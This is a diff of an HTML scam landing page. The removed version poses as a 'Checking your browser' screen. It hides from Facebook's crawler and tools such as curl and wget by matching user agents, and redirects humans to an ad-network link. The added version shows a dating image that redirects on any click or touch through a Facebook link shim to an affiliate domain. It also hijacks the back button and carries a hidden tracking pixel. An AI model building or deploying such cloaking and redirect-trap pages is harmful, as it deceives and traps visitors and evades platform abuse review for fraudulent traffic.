@@ -1,59 +1,54 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <title>Checking your browser...</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta charset="UTF-8">
+  <title>Landing</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
-    body {
-      font-family: Arial, sans-serif;
-      text-align: center;
-      padding-top: 100px;
+    html, body {
+      margin: 0;
+      padding: 0;
+      background-color: #000;
+      height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    img {
+      max-width: 100%;
+      height: auto;
+      cursor: pointer;
+      border: none;
+      display: block;
     }
   </style>
+  <script>
+    const cpaUrl = "https://l.facebook.com/l.php?u=https%3A%2F%2Fdaupmrb.exciting-mixer-dates.com%2Fumlr55m%3Ffbclid%3DIwZXh0bgNhZW0CMTEAYnJpZBExRzJwNTVHNW50aXBoSGx6QgEeFhTjZnWqN9wggKXKP-C50bRFba3mnryanJiYZBCDgG_RphK2H-mMOtWjAII_aem__GGlf1oDIjQsF1IWx4waWA&h=AT2Y7_5wUyMC_53oViLLm4ZvryGA949j85CJpakpgzx86iISULtnaEwWNezAlR7HJzBU2zQBMFUzyRczk3OcUpFWi9UgBJ1-TsbkyWVzSqas4smJ7evzpmqCqvG42VWe0O4p2K4REvjBLywj6g&__tn__=H-R&c[0]=AT1_XC6cht-fx00LYvu8eTGk-iVfoO1BQ5ryqDg3YT8GAnKCg9K2pJZuaMJ0bJ6O6LYj7l3w3jXqPr5eSehkZjhvypK9p20Zw-83TeND1eE3SFuElrVhDnuuE7RwBvRdGaTMEGDOcZ2Y-lGeXzu75C6fdm9eGisXkVuOn9ksG_5sNA";
+
+    // Click redirige
+    function redirectNow() {
+      window.location.href = cpaUrl;
+    }
+
+    // Anti-bot básico (delay antes de activar redirección)
+    setTimeout(() => {
+      document.getElementById("main-img").addEventListener("click", redirectNow);
+      document.body.addEventListener("touchstart", redirectNow);
+    }, 800);
+
+    // Back button hijack
+    history.pushState(null, null, location.href);
+    window.onpopstate = function () {
+      location.href = cpaUrl;
+    };
+  </script>
 </head>
 <body>
-  <h2>Verifying your browser, please wait...</h2>
-  <p>This may take a few seconds.</p>
-
-  <script>
-    // Simple anti-bot logic
-    function isBot() {
-      const bots = [
-        /bot/i,
-        /facebookexternalhit/i,
-        /crawler/i,
-        /spider/i,
-        /preview/i,
-        /fetch/i,
-        /axios/i,
-        /python/i,
-        /Go-http-client/i,
-        /wget/i,
-        /curl/i
-      ];
-
-      const ua = navigator.userAgent;
-
-      return bots.some(bot => bot.test(ua)) || !navigator.cookieEnabled || !window.navigator;
-    }
-
-    function redirectUser() {
-      // Replace this with your actual landing link
-      window.location.href = "https://www.profitableratecpm.com/tt8k7succ?key=16da75e3921e95e74ba03df4724376b0";
-    }
-
-    // Delay helps avoid accidental redirects and mimics human behavior
-    setTimeout(() => {
-      if (!isBot()) {
-        redirectUser();
-      }
-    }, 2000);
-  </script>
-   </script>
+  <img id="main-img" src="https://media.discordapp.net/attachments/1290037908715343956/1383406854654263408/dating.png?ex=684ead88&is=684d5c08&hm=86f919c60fa2363df50640baf3d5c8d6579b3ba28ab1e4ae7f825eb9df644fd5&=&format=webp&quality=lossless&width=515&height=789" alt="Click" />
+</body>
+</script>
   <div style="visibility:hidden">
     <center><img src="//whos.amung.us/pingjs/?k=lonelywolf&amp;t=TeamCastle&amp;x=https://www.youtube.com/" style="display:none">
     </center>
 </div>
-</body>
 </html>
